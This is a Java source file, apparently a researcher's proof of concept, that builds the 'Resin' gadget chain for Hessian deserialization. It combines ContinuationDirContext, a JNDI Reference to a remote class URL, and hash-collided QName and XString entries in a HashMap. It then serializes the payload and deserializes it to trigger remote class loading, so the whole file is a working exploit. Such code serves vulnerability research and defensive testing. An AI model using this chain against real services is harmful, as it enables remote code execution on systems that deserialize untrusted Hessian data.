package org.h3rmesk1t.Hessian;

import com.caucho.hessian.io.*;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.springframework.aop.target.HotSwappableTargetSource;
import sun.reflect.ReflectionFactory;
import com.caucho.naming.QName;
import javax.naming.CannotProceedException;
import javax.naming.Reference;
import javax.naming.directory.DirContext;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Hashtable;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/12 12:40 上午
 */
public class ResinGadget {

    public static Field getField (final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }

    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static String unhash ( int hash ) {
        int target = hash;
        StringBuilder answer = new StringBuilder();
        if ( target < 0 ) {
            // String with hash of Integer.MIN_VALUE, 0x80000000
            answer.append("\\u0915\\u0009\\u001e\\u000c\\u0002");

            if ( target == Integer.MIN_VALUE )
                return answer.toString();
            // Find target without sign bit set
            target = target & Integer.MAX_VALUE;
        }

        unhash0(answer, target);
        return answer.toString();
    }

    private static void unhash0 ( StringBuilder partial, int target ) {
        int div = target / 31;
        int rem = target % 31;

        if ( div <= Character.MAX_VALUE ) {
            if ( div != 0 )
                partial.append((char) div);
            partial.append((char) rem);
        }
        else {
            unhash0(partial, div);
            partial.append((char) rem);
        }
    }

    public static void main(String[] args) throws Exception {

        String remoteUrl = "http://127.0.0.1:8180/";
        String remoteClass = "ExecTemplateJDK8";
        Class<?> ccCl = Class.forName("javax.naming.spi.ContinuationDirContext");
        Constructor<?> ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
        ccCons.setAccessible(true);
        CannotProceedException cpe = new CannotProceedException();
        setFieldValue(cpe, "cause", null);
        setFieldValue(cpe, "stackTrace", null);

        cpe.setResolvedObj(new Reference("Foo", remoteClass, remoteUrl));

        setFieldValue(cpe, "suppressedExceptions", null);
        DirContext ctx = (DirContext) ccCons.newInstance(cpe, new Hashtable<>());
        QName qName = new QName(ctx, "foo", "bar");

        String unhash = unhash(qName.hashCode());
        XString xString = new XString(unhash);

        HashMap<Object, Object> hashMap = new HashMap<>();
        setFieldValue(hashMap, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, qName, qName, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, xString, xString, null));
        setFieldValue(hashMap, "table", tbl);

        // Hessian 序列化数据
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        HessianOutput hessianOutput = new HessianOutput(byteArrayOutputStream);
        AllowNonSerializableFactory serializableFactory = new AllowNonSerializableFactory();
        serializableFactory.setAllowNonSerializable(true);
        hessianOutput.setSerializerFactory(serializableFactory);
        hessianOutput.writeObject(hashMap);
        byte[] serializedData = byteArrayOutputStream.toByteArray();
        System.out.println("Hessian 序列化数据为: " + new String(serializedData, 0, serializedData.length));

        // Hessian 反序列化数据
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(serializedData);
        HessianInput hessianInput = new HessianInput(byteArrayInputStream);
        hessianInput.readObject();
    }
}
